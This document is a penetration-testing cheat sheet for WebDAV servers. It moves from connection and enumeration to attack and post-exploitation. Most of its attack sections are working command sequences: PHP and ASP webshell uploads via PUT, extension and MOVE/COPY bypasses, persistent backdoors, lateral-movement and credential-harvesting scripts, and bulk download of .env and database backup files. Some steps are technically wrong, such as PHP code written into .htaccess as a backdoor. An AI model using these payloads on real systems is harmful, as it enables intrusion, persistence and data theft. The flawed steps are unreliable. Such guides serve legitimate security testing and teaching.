# WebDAV

**`Default Ports: 80 (HTTP), 443 (HTTPS)`**

**WebDAV** is an extension of HTTP that allows clients to perform remote web content authoring operations. It enables users to collaboratively edit and manage files on remote web servers. WebDAV adds methods like PUT, DELETE, PROPFIND, and others to the standard HTTP methods. Common implementations include Microsoft IIS WebDAV, Apache mod\_dav, and various cloud storage solutions. Misconfigurations can lead to file upload vulnerabilities and unauthorized access.

### Connect <a href="#connect" id="connect"></a>

#### Using cadaver (WebDAV client) <a href="#using-cadaver-webdav-client" id="using-cadaver-webdav-client"></a>

```
# Connect to WebDAV server
cadaver http://target.com/webdav/

# With authentication
cadaver http://target.com/webdav/
Username: admin
Password: password

# HTTPS connection
cadaver https://target.com/webdav/

# Once connected, use DAV commands:
dav:/webdav/> ls
dav:/webdav/> put localfile.txt
dav:/webdav/> get remotefile.txt
dav:/webdav/> delete file.txt
```

#### Using cURL <a href="#using-curl" id="using-curl"></a>

```
# List directory (PROPFIND)
curl -X PROPFIND http://target.com/webdav/ -u username:password

# Upload file (PUT)
curl -X PUT http://target.com/webdav/file.txt -u username:password -d @localfile.txt

# Download file (GET)
curl http://target.com/webdav/file.txt -u username:password -o file.txt

# Delete file (DELETE)
curl -X DELETE http://target.com/webdav/file.txt -u username:password

# Create directory (MKCOL)
curl -X MKCOL http://target.com/webdav/newdir/ -u username:password
```

#### Mount as Network Drive <a href="#mount-as-network-drive" id="mount-as-network-drive"></a>

```
# Linux - mount WebDAV
mount -t davfs http://target.com/webdav/ /mnt/webdav
# Or
davfs2 http://target.com/webdav/ /mnt/webdav

# Windows - map network drive
net use Z: http://target.com/webdav/ /user:username password

# macOS - mount WebDAV
mount_webdav http://target.com/webdav/ /Volumes/webdav
```

### Recon <a href="#recon" id="recon"></a>

#### Service Detection with Nmap <a href="#service-detection-with-nmap" id="service-detection-with-nmap"></a>

Use Nmap to detect WebDAV services and identify server capabilities.

```
nmap -p 80,443 target.com
```

#### Banner Grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

Connect to WebDAV services to gather version and service information.

**Using curl**

```
# Test with curl
curl -X OPTIONS http://target.com/webdav/ -v

# Check for DAV header
# DAV: 1, 2
# DAV: <http://apache.org/dav/propset/fs/1>
```

**Using nmap**

```
# HTTP methods enumeration
nmap -p 80,443 --script http-methods target.com
nmap -p 80,443 --script http-webdav-scan target.com

# WebDAV path detection
nmap -p 80 --script http-webdav-scan --script-args http-webdav-scan.path=/webdav/ target.com
```

#### WebDAV Path Discovery <a href="#webdav-path-discovery" id="webdav-path-discovery"></a>

Discover common WebDAV paths and endpoints.

```
# Common paths
/webdav/
/dav/
/WebDAV/
/uploads/
/files/
/_vti_bin/
/sharepoint/
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

Use various tools for detailed WebDAV enumeration and information gathering.

#### HTTP Methods Enumeration <a href="#http-methods-enumeration" id="http-methods-enumeration"></a>

Identify which WebDAV methods are enabled to determine attack surface.

```
# Using curl OPTIONS
curl -X OPTIONS http://target.com/webdav/ -v

# Look for methods in Allow header:
# Allow: OPTIONS, GET, HEAD, POST, DELETE, TRACE, PROPFIND, PROPPATCH, COPY, MOVE, LOCK, UNLOCK, PUT

# Using davtest
davtest -url http://target.com/webdav/ -auth username:password

# Test specific method
curl -X PROPFIND http://target.com/webdav/ -u username:password
```

#### Directory Listing <a href="#directory-listing" id="directory-listing"></a>

Enumerate directory contents and file properties using PROPFIND method.

```
# Using PROPFIND method
curl -X PROPFIND http://target.com/webdav/ \
  -u username:password \
  -H "Depth: 1"

# Recursive listing
curl -X PROPFIND http://target.com/webdav/ \
  -u username:password \
  -H "Depth: infinity"

# Using cadaver
cadaver http://target.com/webdav/
dav:/webdav/> ls -la
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

Exploit various WebDAV vulnerabilities and misconfigurations for unauthorized access.

#### Authentication Bypass <a href="#authentication-bypass" id="authentication-bypass"></a>

Test for WebDAV authentication bypass vulnerabilities.

```
# Try without credentials
curl -X OPTIONS http://target.com/webdav/
curl -X PROPFIND http://target.com/webdav/

# Try with default credentials
admin:admin
admin:password
webdav:webdav

# Test authentication
curl -X PROPFIND http://target.com/webdav/ -u admin:admin
```

#### File Upload (PUT Method) <a href="#file-upload-put-method" id="file-upload-put-method"></a>

Upload malicious files using WebDAV PUT method.

```
# Upload PHP webshell
curl -X PUT http://target.com/webdav/shell.php \
  -u username:password \
  -d '<?php system($_GET["cmd"]); ?>'

# Access shell
curl http://target.com/webdav/shell.php?cmd=whoami

# Upload ASP webshell
curl -X PUT http://target.com/webdav/shell.asp \
  -u username:password \
  -d '<%=CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()%>'

# Upload other file types
curl -X PUT http://target.com/webdav/shell.txt \
  -u username:password \
  --data-binary @shell.php
```

#### Extension Bypass <a href="#extension-bypass" id="extension-bypass"></a>

Bypass file extension restrictions for webshell upload.

```
# Try various extensions
shell.php
shell.php.txt
shell.txt
shell.phtml
shell.php5
shell.php7

# Upload with different Content-Type
curl -X PUT http://target.com/webdav/shell.php \
  -H "Content-Type: image/jpeg" \
  -u username:password \
  -d '<?php system($_GET["cmd"]); ?>'
```

#### MOVE/COPY Method Exploitation <a href="#movecopy-method-exploitation" id="movecopy-method-exploitation"></a>

Use MOVE/COPY methods to bypass file restrictions.

```
# Upload as .txt, then MOVE to .php
curl -X PUT http://target.com/webdav/shell.txt \
  -u username:password \
  -d '<?php system($_GET["cmd"]); ?>'

curl -X MOVE http://target.com/webdav/shell.txt \
  -u username:password \
  -H "Destination: http://target.com/webdav/shell.php"

# Or COPY
curl -X COPY http://target.com/webdav/legit.txt \
  -u username:password \
  -H "Destination: http://target.com/webdav/backdoor.php"
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

Extract sensitive data and establish persistent access after successful WebDAV exploitation.

#### Backdoor Upload <a href="#backdoor-upload" id="backdoor-upload"></a>

Upload persistent webshells for long-term access.

```
# Upload persistent webshell
cat > advanced_shell.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    system($_REQUEST['cmd']);
}
if(isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
}
?>
EOF

curl -X PUT http://target.com/webdav/system.php \
  -u username:password \
  --data-binary @advanced_shell.php
```

#### Data Exfiltration <a href="#data-exfiltration" id="data-exfiltration"></a>

Extract sensitive data from compromised WebDAV servers.

```
# Download all files
cadaver http://target.com/webdav/
dav:/webdav/> mget *

# Using wget
wget -r --user=username --password=password http://target.com/webdav/

# Specific sensitive files
curl http://target.com/webdav/config.php -u username:password -o config.php
curl http://target.com/webdav/.env -u username:password -o .env
```

#### Persistence <a href="#persistence" id="persistence"></a>

Create persistent backdoor access to compromised WebDAV systems.

```
# Upload multiple backdoors
curl -X PUT http://target.com/webdav/backup.php \
  -u username:password \
  -d '<?php system($_GET["c"]); ?>'

# Upload to different directories
curl -X PUT http://target.com/webdav/uploads/shell.php \
  -u username:password \
  -d '<?php system($_GET["cmd"]); ?>'

# Create hidden backdoor
curl -X PUT http://target.com/webdav/.htaccess \
  -u username:password \
  -d '<?php system($_GET["cmd"]); ?>'
```

#### Lateral Movement <a href="#lateral-movement" id="lateral-movement"></a>

Expand access to other systems using WebDAV access.

```
# Upload network scanning script
curl -X PUT http://target.com/webdav/scan.php \
  -u username:password \
  -d '<?php system("nmap -sn 192.168.1.0/24"); ?>'

# Execute via webshell
curl "http://target.com/webdav/scan.php"

# Upload credential harvesting script
curl -X PUT http://target.com/webdav/creds.php \
  -u username:password \
  -d '<?php system("cat /etc/passwd"); ?>'
```

#### Credential Harvesting <a href="#credential-harvesting" id="credential-harvesting"></a>

Extract credentials and sensitive information from WebDAV systems.

```
# Download configuration files
curl http://target.com/webdav/config/database.php -u username:password -o db_config.php
curl http://target.com/webdav/.env -u username:password -o env_file

# Search for sensitive files
curl -X PROPFIND http://target.com/webdav/ \
  -u username:password \
  -H "Depth: infinity" | grep -i "password\|secret\|key"

# Download backup files
curl http://target.com/webdav/backup.sql -u username:password -o backup.sql
curl http://target.com/webdav/database.sql -u username:password -o database.sql
```

### WebDAV HTTP Methods <a href="#webdav-http-methods" id="webdav-http-methods"></a>

| Method      | Description         | Security Impact           |
| ----------- | ------------------- | ------------------------- |
| `OPTIONS`   | Get allowed methods | Information disclosure    |
| `PROPFIND`  | Get properties      | Directory listing         |
| `PROPPATCH` | Modify properties   | Metadata modification     |
| `MKCOL`     | Create collection   | Directory creation        |
| `COPY`      | Copy resource       | File duplication          |
| `MOVE`      | Move resource       | File renaming/moving      |
| `LOCK`      | Lock resource       | Access control            |
| `UNLOCK`    | Unlock resource     | Lock bypass               |
| `PUT`       | Upload file         | File upload vulnerability |
| `DELETE`    | Delete file         | File deletion             |

### Useful Tools <a href="#useful-tools" id="useful-tools"></a>

| Tool       | Description     | Primary Use Case     |
| ---------- | --------------- | -------------------- |
| cadaver    | WebDAV client   | Interactive access   |
| davtest    | WebDAV tester   | Upload testing       |
| curl       | HTTP client     | Method testing       |
| Nmap       | Network scanner | Service detection    |
| Burp Suite | Web proxy       | Request manipulation |

### Security Misconfigurations <a href="#security-misconfigurations" id="security-misconfigurations"></a>

* ❌ No authentication required
* ❌ Weak credentials
* ❌ PUT method enabled
* ❌ DELETE method enabled
* ❌ No file type restrictions
* ❌ Writable webroot
* ❌ No SSL/TLS encryption
* ❌ Directory listing enabled
* ❌ No upload size limits
* ❌ Verbose error messages

<br>
